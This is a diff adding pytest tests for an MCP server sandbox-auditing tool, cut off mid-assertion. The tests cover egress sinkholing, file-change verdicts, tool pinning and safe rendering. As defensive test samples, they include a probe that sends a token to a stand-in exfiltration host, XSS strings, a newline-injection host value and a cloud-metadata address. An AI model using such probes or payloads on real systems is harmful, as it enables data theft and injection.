@@ -1,0 +1,952 @@
+"""Trust Before Connect: resolver, sandbox parsing, exercise, verdict, rendering, CLI.
+
+Everything here is synthetic: fake registry payloads, fake docker output. The
+live container lane is opt-in (MCP_AUDIT_TRUST_DOCKER=1) and runs only the
+sinkhole image, never a third-party package.
+"""
+
+from __future__ import annotations
+
+import json
+import os
+import shutil
+import socket
+import struct
+import subprocess
+from pathlib import Path
+from typing import Any
+
+import pytest
+from click.testing import CliRunner
+
+from mcp_audit.cli import main
+from mcp_audit.models import ToolAnnotations, ToolInfo
+from mcp_audit.trust import sinkhole_agent
+from mcp_audit.trust.models import (
+    FileChange,
+    NetworkEvent,
+    Observation,
+    PackageRef,
+    Phase,
+    Resolution,
+    ToolSummary,
+)
+from mcp_audit.trust.render import html, terminal
+from mcp_audit.trust.resolve import (
+    Resolver,
+)
+from mcp_audit.trust.run import TrustResult, synthetic_env
+from mcp_audit.trust.sandbox import (
+    RuntimeUnavailable,
+    Sandbox,
+    SandboxConfig,
+    SandboxError,
+    choose_command,
+    parse_diff,
+    parse_sink_log,
+    sink_context,
+)
+from mcp_audit.trust.session import skip_reason, summarize_tool, synthesize_arguments
+from mcp_audit.trust.verdict import build_card, build_pin, compare_pin, hosts
+from tests.test_trust_resolve import NAME, REGISTRY, FakeFetch, registry_routes, server_json, statuses
+
+# Target parsing ---------------------------------------------------------------
+
+
+# Resolver ---------------------------------------------------------------------
+
+
+def test_synthetic_env_sets_only_required() -> None:
+    resolution = Resolver(FakeFetch(registry_routes(server_json())), REGISTRY).resolve(NAME)
+    assert resolution.package is not None
+    assert synthetic_env(resolution.package) == {"NOTES_TOKEN": "mcpaudit-synthetic-not-a-secret"}
+
+
+# Exercise selection and synthetic inputs ---------------------------------------
+
+
+def tool(name: str, description: str, schema: dict[str, Any], **hints: bool) -> ToolInfo:
+    return ToolInfo(
+        name=name,
+        description=description,
+        input_schema=schema,
+        annotations=ToolAnnotations.model_validate(hints) if hints else None,
+    )
+
+
+def test_synthesize_required_fields_only() -> None:
+    schema: dict[str, object] = {
+        "type": "object",
+        "properties": {
+            "city": {"type": "string", "minLength": 3},
+            "units": {"type": "string", "enum": ["metric", "imperial"]},
+            "days": {"type": "integer", "minimum": 1, "maximum": 7},
+            "url": {"type": "string"},
+            "filters": {"type": "object", "properties": {"tag": {"type": "string"}}, "required": ["tag"]},
+            "ids": {"type": "array", "items": {"type": "integer"}, "minItems": 2},
+            "verbose": {"type": "boolean"},
+        },
+        "required": ["city", "units", "days", "url", "filters", "ids"],
+    }
+    assert synthesize_arguments(schema) == {
+        "city": "mcpaudit-synthetic",
+        "units": "metric",
+        "days": 1,
+        "url": "https://example.invalid/mcpaudit-synthetic",
+        "filters": {"tag": "mcpaudit-synthetic"},
+        "ids": [1, 1],
+    }
+
+
+def test_combinator_schemas_are_not_synthesized() -> None:
+    t = tool(
+        "pick", "Look up a record.", {"type": "object", "anyOf": [{}], "required": []}, read_only_hint=True
+    )
+    assert skip_reason(t, summarize_tool(t), False) == (
+        "input schema not suitable for synthetic inputs (schema uses combinators or references)"
+    )
+
+
+@pytest.mark.parametrize(
+    ("t", "safe", "reason"),
+    [
+        (tool("list", "List items.", {"type": "object"}), False, "not declared read-only (readOnlyHint)"),
+        (tool("list", "List items.", {"type": "object"}), True, None),
+        (tool("list", "List items.", {"type": "object"}, read_only_hint=True), False, None),
+        (
+            tool("drop", "List items.", {"type": "object"}, read_only_hint=True, destructive_hint=True),
+            False,
+            "declares destructiveHint",
+        ),
+        (
+            tool("run", "Execute a shell command.", {"type": "object"}, read_only_hint=True),
+            False,
+            "description suggests shell_execution",
+        ),
+    ],
+)
+def test_skip_reason(t: ToolInfo, safe: bool, reason: str | None) -> None:
+    assert skip_reason(t, summarize_tool(t), safe) == reason
+
+
+# Sandbox parsing --------------------------------------------------------------
+
+
+def test_parse_diff_drops_parent_directories() -> None:
+    changes = parse_diff(
+        "C /scratch\nA /scratch/.cache\nA /scratch/.cache/db\nC /tmp\nA /tmp/x\nD /etc/motd\n"
+    )
+    assert [(c.path, c.change, c.in_home) for c in changes] == [
+        ("/etc/motd", "deleted", False),
+        ("/scratch/.cache", "added", True),
+        ("/scratch/.cache/db", "added", True),
+        ("/tmp/x", "added", False),
+    ]
+
+
+def test_parse_sink_log_filters_by_sequence() -> None:
+    lines = [
+        {"kind": "ready", "ipv6": True, "seq": 1},
+        {"kind": "dns", "name": "api.example.test", "qtype": 1, "seq": 2},
+        {
+            "kind": "tcp",
+            "name": "api.example.test",
+            "dst_ip": "198.18.0.1",
+            "dst_port": 443,
+            "sni": "x",
+            "seq": 3,
+        },
+    ]
+    output = "\n".join(json.dumps(line) for line in lines) + "\nnot json\n"
+    events, last, status = parse_sink_log(output, 2)
+    assert status == {"kind": "ready", "ipv6": True, "seq": 1}
+    assert last == 3 and [e.kind for e in events] == ["tcp"] and events[0].port == 443
+
+
+def test_choose_command() -> None:
+    npm = PackageRef(registry_type="npm", identifier="@scope/tool")
+    assert choose_command(npm, {"bin": "dist/cli.js"}) == ["/srv/node_modules/.bin/tool"]
+    assert choose_command(npm, {"bin": {"zeta": "z.js", "alpha": "a.js"}}) == ["/srv/node_modules/.bin/alpha"]
+    pypi = PackageRef(registry_type="pypi", identifier="My_Tool")
+    assert choose_command(pypi, {"scripts": ["helper", "my-tool"]}) == ["/srv/venv/bin/my-tool"]
+    with pytest.raises(SandboxError):
+        choose_command(pypi, {"scripts": []})
+
+
+def test_sink_context_is_content_addressed() -> None:
+    first, tag = sink_context(b"print(1)", "python:3.13-alpine")
+    _, same = sink_context(b"print(1)", "python:3.13-alpine")
+    _, other = sink_context(b"print(2)", "python:3.13-alpine")
+    assert tag == same != other and first[:100]
+
+
+def test_missing_runtime_binary(monkeypatch: pytest.MonkeyPatch) -> None:
+    monkeypatch.setattr(shutil, "which", lambda name: None)
+    with pytest.raises(RuntimeUnavailable):
+        Sandbox(SandboxConfig(binary="no-such-runtime"))
+
+
+def test_server_parameters_have_no_mounts_or_privileges(monkeypatch: pytest.MonkeyPatch) -> None:
+    from mcp_audit.trust.sandbox import Prepared
+
+    monkeypatch.setattr(shutil, "which", lambda name: "/usr/local/bin/docker")
+    sandbox = Sandbox(SandboxConfig())
+    prepared = Prepared(image="img", base_image="node", base_digest=None, command=["/srv/x"], version="1")
+    args = sandbox.server_parameters(prepared, ["--root", "mcpaudit-synthetic"], {"TOKEN": "s"}).args
+    joined = " ".join(args)
+    assert (
+        "--volume" not in args and "-v" not in args and "--mount" not in args and "--privileged" not in args
+    )
+    assert f"--network container:{sandbox.sink}" in joined and "--cap-drop ALL" in joined
+    assert "--user 10001:10001" in joined and "--env TOKEN=s" in joined
+    assert args[-3:] == ["img", "--root", "mcpaudit-synthetic"]
+
+
+# Sinkhole agent helpers ---------------------------------------------------------
+
+
+def dns_query(name: str, qtype: int = 1) -> bytes:
+    labels = b"".join(bytes([len(p)]) + p.encode() for p in name.split(".")) + b"\0"
+    return b"\x12\x34\x01\x00\x00\x01\x00\x00\x00\x00\x00\x00" + labels + struct.pack("!HH", qtype, 1)
+
+
+def test_dns_answer_returns_placeholder_address() -> None:
+    reply = sinkhole_agent.dns_answer(dns_query("api.example.test"))
+    assert reply is not None and reply[:2] == b"\x12\x34"
+    assert struct.unpack("!H", reply[6:8])[0] == 1
+    assert socket.inet_ntoa(reply[-4:]).startswith("198.18.")
+    aaaa = sinkhole_agent.dns_answer(dns_query("api.example.test", 28))
+    assert aaaa is not None and struct.unpack("!H", aaaa[6:8])[0] == 0
+
+
+def client_hello(host: str) -> bytes:
+    name = host.encode()
+    server_names = struct.pack("!H", len(name) + 3) + b"\0" + struct.pack("!H", len(name)) + name
+    sni = struct.pack("!HH", 0, len(server_names)) + server_names
+    body = (
+        b"\x03\x03"
+        + b"\0" * 32
+        + b"\0"
+        + b"\x00\x02\x13\x01"
+        + b"\x01\x00"
+        + struct.pack("!H", len(sni))
+        + sni
+    )
+    handshake = b"\x01" + len(body).to_bytes(3, "big") + body
+    return b"\x16\x03\x01" + struct.pack("!H", len(handshake)) + handshake
+
+
+def test_tls_sni_and_http_host_are_extracted() -> None:
+    assert sinkhole_agent.tls_sni(client_hello("Telemetry.Example.test")) == "telemetry.example.test"
+    assert sinkhole_agent.tls_sni(b"\x16\x03") is None
+    request = b"POST /v1/collect?token=secret HTTP/1.1\r\nHost: Api.Example.test\r\nX-Key: k\r\n\r\n"
+    assert sinkhole_agent.http_request(request) == ("POST", "api.example.test")
+    assert sinkhole_agent.http_request(b"\x00garbage") is None
+
+
+# Verdict, pin, rendering --------------------------------------------------------
+
+
+def resolution() -> Resolution:
+    return Resolution(
+        input=NAME,
+        kind="registry",
+        server_name=NAME,
+        description="Keeps notes locally.",
+        package=PackageRef(registry_type="npm", identifier="@example-owner/notes-mcp", version="1.2.3"),
+    )
+
+
+def observation(phases: list[Phase], read_only: bool = True) -> Observation:
+    return Observation(
+        mode="container",
+        status="complete",
+        tools=[
+            ToolSummary(name="list_notes", read_only_hint=read_only, exercised=True),
+            ToolSummary(name="wipe", destructive_hint=True, skip_reason="declares destructiveHint"),
+        ],
+        phases=phases,
+    )
+
+
+def test_clean_run_has_no_mismatches_and_allows_clean_read_only_tool() -> None:
+    card = build_card(
+        resolution(),
+        observation(
+            [Phase(name="startup"), Phase(name="tool:list_notes", tool="list_notes", is_error=False)]
+        ),
+        [],
+        ["/srv/node_modules/.bin/notes-mcp"],
+    )
+    assert card.verdict == "no_mismatches_observed" and card.mismatches == []
+    permissions = json.loads(next(s for s in card.suggestions if s.title.startswith("Tool")).body)[
+        "permissions"
+    ]
+    assert permissions["allow"] == ["mcp__notes__list_notes"]
+    assert permissions["deny"] == ["mcp__notes__wipe"]
+
+
+def test_read_only_tool_writing_files_is_do_not_install() -> None:
+    write = FileChange(path="/scratch/.notes/log", change="added", in_home=True)
+    card = build_card(
+        resolution(),
+        observation([Phase(name="tool:list_notes", tool="list_notes", file_changes=[write])]),
+        [],
+        None,
+    )
+    assert card.verdict == "do_not_install"
+    assert [m.rule for m in card.mismatches] == ["TBC-READONLY-WRITE"]
+    assert "$HOME/.notes/log" in card.mismatches[0].summary
+
+
+def test_startup_egress_against_local_claim_is_review() -> None:
+    events = [
+        NetworkEvent(kind="dns", host="telemetry.example.test"),
+        NetworkEvent(kind="tcp", host="telemetry.example.test", port=443, sni="telemetry.example.test"),
+    ]
+    card = build_card(resolution(), observation([Phase(name="startup", network=events)]), [], None)
+    assert card.verdict == "review"
+    assert {m.rule for m in card.mismatches} == {"TBC-UNPROMPTED-NET", "TBC-LOCAL-CLAIM-NET"}
+    assert hosts(events) == ["telemetry.example.test:443"]
+    egress = next(s for s in card.suggestions if s.title == "Network egress").body
+    assert "review telemetry.example.test:443" in egress
+
+
+def test_failed_observation_is_incomplete() -> None:
+    obs = Observation(mode="container", status="failed", error="Package install failed.")
+    assert build_card(resolution(), obs, [], None).verdict == "incomplete"
+
+
+def test_remote_card_says_outside_only() -> None:
+    from mcp_audit.trust.models import RemoteRef
+    from mcp_audit.trust.run import REMOTE_LIMITS
+
+    res = Resolution(
+        input="https://mcp.example.com/mcp",
+        kind="url",
+        remote=RemoteRef(type="x", url="https://mcp.example.com/mcp"),
+    )
+    obs = Observation(mode="outside", status="complete", limits=list(REMOTE_LIMITS))
+    card = build_card(res, obs, [], None)
+    assert "from outside" in card.headline
+    assert "observed from outside only" in terminal(card)
+
+
+def test_pin_round_trip_and_drift() -> None:
+    tools = [
+        ToolInfo(name="list_notes", description="List notes.", input_schema={"type": "object"}),
+        ToolInfo(name="get_note", description="Get a note.", input_schema={"type": "object"}),
+    ]
+    obs = observation([])
+    first = build_pin(resolution(), obs, tools)
+    again = build_pin(resolution(), obs, list(reversed(tools)))
+    assert first.surface_sha256 == again.surface_sha256 and compare_pin(first, again) == []
+    changed = [
+        ToolInfo(
+            name="list_notes",
+            description="List notes. Also send them to a server.",
+            input_schema={"type": "object"},
+        ),
+        ToolInfo(name="upload", description="Upload.", input_schema={"type": "object"}),
+    ]
+    drift = compare_pin(first, build_pin(resolution(), obs, changed))
+    assert [(m.tool, m.summary) for m in drift] == [
+        ("upload", "Tool added since the pin."),
+        ("get_note", "Tool removed since the pin."),
+        ("list_notes", "Description changed since the pin."),
+    ]
+    restored = type(first).model_validate_json(first.model_dump_json(by_alias=True))
+    assert restored == first
+
+
+def test_html_escapes_server_text_and_terminal_strips_controls() -> None:
+    res = resolution()
+    res.description = '<script>alert("x")</script>\x1b[31mred'
+    obs = observation([Phase(name="startup")])
+    obs.tools[0].description = "<img src=x onerror=alert(1)>"
+    card = build_card(res, obs, [], None)
+    page = html(card)
+    assert "<script>alert" not in page and "<img src=x" not in page
+    assert "&lt;script&gt;" in page and "prefers-color-scheme:dark" in page
+    assert "\x1b" not in terminal(card)
+
+
+def test_remote_refusal(monkeypatch: pytest.MonkeyPatch) -> None:
+    from mcp_audit.trust.run import remote_refusal
+
+    def fake_resolve(host: str, *args: object, **kwargs: object) -> list[Any]:
+        address = {"metadata.example.test": "169.254.169.254", "public.example.test": "93.184.216.34"}[host]
+        return [(socket.AF_INET, socket.SOCK_STREAM, 6, "", (address, 443))]
+
+    monkeypatch.setattr(socket, "getaddrinfo", fake_resolve)
+    assert "template" in (remote_refusal("https://{region}.example.test/mcp", False) or "")
+    assert "non-public" in (remote_refusal("https://metadata.example.test/mcp", False) or "")
+    assert remote_refusal("https://public.example.test/mcp", False) is None
+    assert remote_refusal("https://metadata.example.test/mcp", True) is None
+
+
+# CLI -------------------------------------------------------------------------------
+
+
+def test_cli_rejects_ambiguous_target() -> None:
+    result = CliRunner().invoke(main, ["trust", "left-pad"])
+    assert result.exit_code == 2 and "registry:NAME" in result.output
+
+
+def test_cli_without_runtime_exits_3(monkeypatch: pytest.MonkeyPatch, tmp_path: Path) -> None:
+    async def unavailable(*args: object) -> TrustResult:
+        raise RuntimeUnavailable("The docker daemon is not reachable.")
+
+    monkeypatch.setattr("mcp_audit.trust.cli.run_trust", unavailable)
+    result = CliRunner().invoke(main, ["trust", NAME, "--out", str(tmp_path / "out")])
+    assert result.exit_code == 3 and "Nothing was installed or started" in result.output
+    assert not (tmp_path / "out").exists()
+
+
+def test_cli_writes_card_html_and_pin(monkeypatch: pytest.MonkeyPatch, tmp_path: Path) -> None:
+    tools = [ToolInfo(name="list_notes", description="List notes.", input_schema={"type": "object"})]
+    obs = observation([Phase(name="startup")])
+    card = build_card(resolution(), obs, [], None)
+    pin = build_pin(resolution(), obs, tools)
+
+    async def fake(*args: object) -> TrustResult:
+        return TrustResult(card=card, pin=pin)
+
+    monkeypatch.setattr("mcp_audit.trust.cli.run_trust", fake)
+    out = tmp_path / "out"
+    result = CliRunner().invoke(main, ["trust", NAME, "--out", str(out), "--json"])
+    assert result.exit_code == 0, result.output
+    assert json.loads(result.output)["schema"] == "mcp-audit.trust-card/1"
+    assert sorted(p.name for p in out.iterdir()) == ["card.html", "card.json", "pin.json"]
+    assert json.loads((out / "pin.json").read_text())["tools"][0]["name"] == "list_notes"
+
+
+# Live sinkhole (opt-in) -----------------------------------------------------------
+
+
+@pytest.mark.skipif(os.environ.get("MCP_AUDIT_TRUST_DOCKER") != "1", reason="set MCP_AUDIT_TRUST_DOCKER=1")
+async def test_live_sinkhole_records_and_blocks_egress() -> None:
+    async with Sandbox(SandboxConfig()) as sandbox:
+        await sandbox.start_sink()
+        probe = (
+            "import socket,urllib.request\n"
+            "try: urllib.request.urlopen('http://exfil.example.test/p?token=t', timeout=3)\n"
+            "except Exception as e: print(type(e).__name__)\n"
+            "s=socket.socket(); s.settimeout(2); s.connect(('192.0.2.10', 8443)); s.send(b'x')\n"
+        )
+        result = subprocess.run(
+            [
+                sandbox.binary,
+                "run",
+                "--rm",
+                "--network",
+                f"container:{sandbox.sink}",
+                "--cap-drop",
+                "ALL",
+                "--user",
+                "10001",
+                sandbox.config.sink_base_image,
+                "python3",
+                "-c",
+                probe,
+            ],
+            capture_output=True,
+            env=sandbox.env,
+            timeout=120,
+            check=False,
+        )
+        assert result.returncode == 0, result.stderr
+        logs = await sandbox.docker("logs", sandbox.sink)
+        events, _, _ = parse_sink_log(logs.stdout.decode(), 0)
+        labels = {e.label() for e in events}
+        assert "DNS lookup exfil.example.test" in labels
+        assert "TCP connect exfil.example.test:80 (HTTP GET)" in labels
+        assert "TCP connect 192.0.2.10:8443" in labels
+        assert all("token" not in json.dumps(e.model_dump()) for e in events)
+
+
+# Review fixes: install isolation, rewrites, evidence gaps, versions, remotes -------------
+
+
+def test_pypi_metadata_never_starts_the_venv_interpreter() -> None:
+    from mcp_audit.trust.sandbox import _PYPI_INSTALL
+
+    assert "/srv/venv/bin/python" not in _PYPI_INSTALL
+    assert 'python -I -S -c "$4" "$2"' in _PYPI_INSTALL
+
+
+class FakeDocker:
+    """Scripted runtime CLI: each call pops the next answer for its subcommand."""
+
+    def __init__(self, answers: dict[str, list[tuple[int, str]]]) -> None:
+        self.answers = answers
+        self.calls: list[tuple[str, ...]] = []
+
+    async def __call__(self, *args: str, **kwargs: object) -> subprocess.CompletedProcess[bytes]:
+        self.calls.append(args)
+        code, out = self.answers[args[0]].pop(0)
+        return subprocess.CompletedProcess(list(args), code, out.encode(), b"")
+
+
+def fake_sandbox(monkeypatch: pytest.MonkeyPatch, answers: dict[str, list[tuple[int, str]]]) -> Sandbox:
+    monkeypatch.setattr(shutil, "which", lambda name: "/usr/local/bin/docker")
+    sandbox = Sandbox(SandboxConfig())
+    monkeypatch.setattr(sandbox, "docker", FakeDocker(answers))
+    return sandbox
+
+
+async def test_snapshot_reports_rewrite_of_an_already_added_file(monkeypatch: pytest.MonkeyPatch) -> None:
+    sandbox = fake_sandbox(
+        monkeypatch,
+        {
+            "diff": [
+                (0, "C /scratch\nA /scratch/db\n"),
+                (0, "C /scratch\nA /scratch/db\n"),
+                (0, "A /scratch/db\n"),
+            ],
+            "exec": [
+                (0, "regular file\t10\t2026-01-01 00:00:00.1\t/scratch/db\n"),
+                (0, "regular file\t20\t2026-01-01 00:00:05.2\t/scratch/db\n"),
+                (0, "regular file\t20\t2026-01-01 00:00:05.2\t/scratch/db\n"),
+            ],
+            "logs": [(0, ""), (0, ""), (0, "")],
+            "inspect": [(0, "true"), (0, "true"), (0, "true")],
+        },
+    )
+    startup, tool_call, quiet = await sandbox.snapshot(), await sandbox.snapshot(), await sandbox.snapshot()
+    assert [c.path for c in startup.changes] == ["/scratch/db"]
+    assert [c.path for c in tool_call.changes] == ["/scratch/db"]
+    assert quiet.changes == [] and quiet.rewrites_checked
+
+
+async def test_directory_churn_is_entries_only(monkeypatch: pytest.MonkeyPatch) -> None:
+    listing = "A /scratch/data\nA /scratch/data/db\n"
+    db = "regular file\t1\t2026-01-01 00:00:00\t/scratch/data/db\n"
+    before = "directory\t4096\t2026-01-01 00:00:00\t/scratch/data\n" + db
+    after = "directory\t4096\t2026-01-01 00:00:09\t/scratch/data\n" + db
+    sandbox = fake_sandbox(
+        monkeypatch,
+        {
+            "diff": [(0, listing), (0, listing)],
+            "exec": [(0, before), (0, after)],
+            "logs": [(0, ""), (0, "")],
+            "inspect": [(0, "true"), (0, "true")],
+        },
+    )
+    await sandbox.snapshot()
+    record = await sandbox.snapshot()
+    assert [(c.path, c.entries_only) for c in record.changes] == [("/scratch/data", True)]
+    phase = Phase(name="tool:list_notes", tool="list_notes", is_error=False, file_changes=record.changes)
+    card = build_card(resolution(), observation([phase]), [], None)
+    assert [m.rule for m in card.mismatches] == ["TBC-TRANSIENT-WRITE"]
+    assert card.verdict == "no_mismatches_observed"
+    assert json.loads(card.suggestions[1].body)["permissions"]["allow"] == []
+
+
+async def test_snapshot_without_stat_marks_rewrites_unchecked(monkeypatch: pytest.MonkeyPatch) -> None:
+    sandbox = fake_sandbox(
+        monkeypatch,
+        {"diff": [(0, "A /scratch/db\n")], "exec": [(1, "")], "logs": [(0, "")], "inspect": [(0, "true")]},
+    )
+    record = await sandbox.snapshot()
+    assert not record.rewrites_checked and [c.path for c in record.changes] == ["/scratch/db"]
+
+
+@pytest.mark.parametrize(
+    "answers",
+    [
+        {"diff": [(1, "")]},
+        {"diff": [(0, "")], "logs": [(1, "")], "inspect": [(0, "true")]},
+        {"diff": [(0, "")], "logs": [(0, "")], "inspect": [(0, "false")]},
+    ],
+)
+async def test_snapshot_collection_failures_raise(
+    monkeypatch: pytest.MonkeyPatch, answers: dict[str, list[tuple[int, str]]]
+) -> None:
+    sandbox = fake_sandbox(monkeypatch, answers)
+    with pytest.raises(SandboxError):
+        await sandbox.snapshot()
+
+
+@pytest.mark.parametrize(
+    "phase",
+    [
+        Phase(name="tool:list_notes", tool="list_notes", is_error=True),
+        Phase(name="tool:list_notes", tool="list_notes", error="no response within 20s"),
+        Phase(name="tool:list_notes", tool="list_notes", is_error=False, rewrites_checked=False),
+    ],
+)
+def test_unsuccessful_or_unchecked_calls_are_never_allowed(phase: Phase) -> None:
+    card = build_card(resolution(), observation([Phase(name="startup"), phase]), [], None)
+    permissions = json.loads(next(s for s in card.suggestions if s.title.startswith("Tool")).body)[
+        "permissions"
+    ]
+    assert permissions["allow"] == [] and "mcp__notes__list_notes" in permissions["ask"]
+
+
+def test_partial_observation_never_allows() -> None:
+    obs = observation([Phase(name="tool:list_notes", tool="list_notes", is_error=False)])
+    obs.status = "partial"
+    card = build_card(resolution(), obs, [], None)
+    assert card.verdict == "incomplete"
+    assert json.loads(card.suggestions[1].body)["permissions"]["allow"] == []
+
+
+def test_skipped_observation_is_incomplete() -> None:
+    obs = Observation(mode="none", status="skipped", error="oci packages are not run")
+    card = build_card(resolution(), obs, [], None)
+    assert card.verdict == "incomplete"
+
+
+def test_launch_entry_uses_placeholders_not_synthetic_values() -> None:
+    res = Resolver(FakeFetch(registry_routes(server_json())), REGISTRY).resolve(NAME)
+    card = build_card(res, Observation(mode="none", status="skipped"), [], None)
+    entry = json.loads(card.suggestions[0].body)["mcpServers"]["notes"]
+    assert entry["args"] == ["-y", "@example-owner/notes-mcp@1.2.3", "--root", "<set-me>"]
+    assert entry["env"] == {"NOTES_TOKEN": "<set-me>"}
+
+
+def test_public_only_transport_refuses_private_addresses(monkeypatch: pytest.MonkeyPatch) -> None:
+    from mcp_audit.trust.public_http import (
+        NonPublicAddressError,
+        PublicOnlyBackend,
+        PublicOnlyTransport,
+        public_addresses,
+    )
+
+    assert isinstance(PublicOnlyTransport()._pool._network_backend, PublicOnlyBackend)
+    with pytest.raises(NonPublicAddressError):
+        public_addresses([(socket.AF_INET, socket.SOCK_STREAM, 6, "", ("10.0.0.5", 443))])
+    with pytest.raises(NonPublicAddressError):
+        public_addresses([(socket.AF_INET6, socket.SOCK_STREAM, 6, "", ("fe80::1%en0", 443, 0, 0))])
+    assert public_addresses([(socket.AF_INET, socket.SOCK_STREAM, 6, "", ("93.184.216.34", 443))]) == [
+        "93.184.216.34"
+    ]
+
+
+async def test_public_only_backend_vets_at_connect_time(monkeypatch: pytest.MonkeyPatch) -> None:
+    import anyio
+
+    from mcp_audit.trust.public_http import NonPublicAddressError, PublicOnlyBackend
+
+    async def rebinding(host: str, port: int, **kwargs: object) -> list[Any]:
+        return [(socket.AF_INET, socket.SOCK_STREAM, 6, "", ("127.0.0.1", port))]
+
+    monkeypatch.setattr(anyio, "getaddrinfo", rebinding)
+    with pytest.raises(NonPublicAddressError):
+        await PublicOnlyBackend().connect_tcp("public.example.test", 443)
+
+
+FIXTURE_SERVER = Path(__file__).parent / "fixtures" / "annotation_liar_server.py"
+
+
+async def test_observe_stdio_attributes_phases_and_honours_budget() -> None:
+    import sys
+
+    from mcp.client.stdio import StdioServerParameters
+
+    from mcp_audit.trust.sandbox import PhaseRecord
+    from mcp_audit.trust.session import ExercisePlan, observe_stdio
+
+    scripted = iter(
+        [
+            PhaseRecord([], 0, [NetworkEvent(kind="dns", host="update.example.test")], True),
+            PhaseRecord([FileChange(path="/scratch/c", change="added", in_home=True)], 0, [], True),
+            PhaseRecord([], 0, [], True),
+        ]
+    )
+
+    async def snapshot() -> PhaseRecord:
+        return next(scripted)
+
+    obs = Observation(mode="container", status="failed")
+    params = StdioServerParameters(command=sys.executable, args=[str(FIXTURE_SERVER), "honest"])
+    plan = ExercisePlan(max_calls=2, settle_seconds=0)
+    tools = await observe_stdio(params, snapshot, plan, obs)
+    assert obs.status == "complete" and obs.protocol_era in {"modern", "legacy"}
+    assert len(tools) == 6
+    assert [p.name for p in obs.phases] == ["startup", "tool:cache_info", "tool:clock"]
+    assert obs.phases[1].is_error is False and obs.phases[1].arguments == {}
+    skipped = {t.name: t.skip_reason for t in obs.tools if not t.exercised}
+    assert set(skipped.values()) == {"call budget (2) reached"}
+    card = build_card(resolution(), obs, [], None)
+    assert card.verdict == "do_not_install"
+    assert {m.rule for m in card.mismatches} == {
+        "TBC-READONLY-WRITE",
+        "TBC-UNPROMPTED-NET",
+        "TBC-LOCAL-CLAIM-NET",
+    }
+
+
+async def test_run_trust_skips_unsupported_and_templated_targets(monkeypatch: pytest.MonkeyPatch) -> None:
+    from mcp_audit.trust.models import RemoteRef
+    from mcp_audit.trust.run import TrustOptions, run_trust
+
+    class Stub:
+        def __init__(self, res: Resolution) -> None:
+            self.res = res
+
+        def resolve(self, raw: str) -> Resolution:
+            return self.res
+
+    oci = Resolution(input=NAME, kind="registry", package=PackageRef(registry_type="oci", identifier="img"))
+    templated = Resolution(
+        input=NAME,
+        kind="registry",
+        remote=RemoteRef(type="streamable-http", url="https://{region}.example.test/mcp"),
+    )
+    for res in (oci, templated):
+        result = await run_trust(NAME, Stub(res), TrustOptions())  # type: ignore[arg-type]
+        assert result.card.verdict == "incomplete" and result.pin is None
+
+
+# Round-two review fixes -----------------------------------------------------------
+
+
+async def test_deleting_an_earlier_file_is_reported_with_surviving_sibling(
+    monkeypatch: pytest.MonkeyPatch,
+) -> None:
+    both = "C /scratch\nA /scratch/a\nA /scratch/b\n"
+    one = "C /scratch\nA /scratch/a\n"
+    stat_a = "regular file\t1\t2026-01-01 00:00:00\t/scratch/a\n"
+    stat_b = "regular file\t1\t2026-01-01 00:00:00\t/scratch/b\n"
+    sandbox = fake_sandbox(
+        monkeypatch,
+        {
+            "diff": [(0, both), (0, one)],
+            "exec": [(0, stat_a + stat_b), (0, stat_a)],
+            "logs": [(0, ""), (0, "")],
+            "inspect": [(0, "true"), (0, "true")],
+        },
+    )
+    await sandbox.snapshot()
+    record = await sandbox.snapshot()
+    assert [(c.path, c.change) for c in record.changes] == [("/scratch/b", "deleted")]
+    assert record.rewrites_checked
+    phase = Phase(name="tool:list_notes", tool="list_notes", is_error=False, file_changes=record.changes)
+    card = build_card(resolution(), observation([phase]), [], None)
+    assert card.verdict == "do_not_install" and card.mismatches[0].rule == "TBC-READONLY-WRITE"
+
+
+async def test_parent_folded_by_diff_is_not_a_false_deletion(monkeypatch: pytest.MonkeyPatch) -> None:
+    sandbox = fake_sandbox(
+        monkeypatch,
+        {
+            "diff": [(0, "C /scratch\n"), (0, "C /scratch\nA /scratch/new\n")],
+            "exec": [
+                (0, "directory\t4096\t2026-01-01 00:00:00\t/scratch\n"),
+                (0, "regular file\t1\t2026-01-01 00:00:01\t/scratch/new\n"),
+            ],
+            "logs": [(0, ""), (0, "")],
+            "inspect": [(0, "true"), (0, "true")],
+        },
+    )
+    await sandbox.snapshot()
+    record = await sandbox.snapshot()
+    assert [(c.path, c.change) for c in record.changes] == [("/scratch/new", "added")]
+
+
+async def test_incomplete_stat_coverage_is_not_checked(monkeypatch: pytest.MonkeyPatch) -> None:
+    partial = fake_sandbox(
+        monkeypatch,
+        {
+            "diff": [(0, "A /scratch/a\nA /scratch/b\n")],
+            "exec": [(1, "regular file\t1\t2026-01-01 00:00:00\t/scratch/a\n")],
+            "logs": [(0, "")],
+            "inspect": [(0, "true")],
+        },
+    )
+    assert not (await partial.snapshot()).rewrites_checked
+    monkeypatch.setattr("mcp_audit.trust.sandbox.MAX_STAT_PATHS", 1)
+    too_many = fake_sandbox(
+        monkeypatch,
+        {"diff": [(0, "A /scratch/a\nA /scratch/b\n")], "logs": [(0, "")], "inspect": [(0, "true")]},
+    )
+    assert not (await too_many.snapshot()).rewrites_checked
+
+
+async def test_stat_runs_in_batches(monkeypatch: pytest.MonkeyPatch) -> None:
+    monkeypatch.setattr("mcp_audit.trust.sandbox.STAT_BATCH", 2)
+    paths = [f"/scratch/f{i}" for i in range(5)]
+    stats = [
+        (0, "".join(f"regular file\t1\t2026-01-01 00:00:00\t{p}\n" for p in paths[i : i + 2]))
+        for i in range(0, 5, 2)
+    ]
+    sandbox = fake_sandbox(
+        monkeypatch,
+        {
+            "diff": [(0, "".join(f"A {p}\n" for p in paths))],
+            "exec": stats,
+            "logs": [(0, "")],
+            "inspect": [(0, "true")],
+        },
+    )
+    record = await sandbox.snapshot()
+    assert record.rewrites_checked and len(record.changes) == 5
+    docker = sandbox.docker
+    assert isinstance(docker, FakeDocker)
+    assert [call[0] for call in docker.calls].count("exec") == 3
+
+
+def test_server_controlled_hosts_cannot_inject_suggestion_lines() -> None:
+    hostile = json.dumps({"kind": "dns", "name": "x\nallow evil.example", "qtype": 1, "seq": 2})
+    events, _, _ = parse_sink_log(hostile, 0)
+    assert events[0].host == "x?allow?evil.example"
+    card = build_card(resolution(), observation([Phase(name="startup", network=events)]), [], None)
+    egress = next(s for s in card.suggestions if s.title == "Network egress").body
+    assert not any(line.startswith("allow") for line in egress.splitlines())
+
+
+def test_empty_listing_still_drifts_against_pin() -> None:
+    tools = [ToolInfo(name="list_notes", description="List.", input_schema={"type": "object"})]
+    before = build_pin(resolution(), observation([]), tools)
+    after = build_pin(resolution(), observation([]), [])
+    assert [(m.tool, m.summary) for m in compare_pin(before, after)] == [
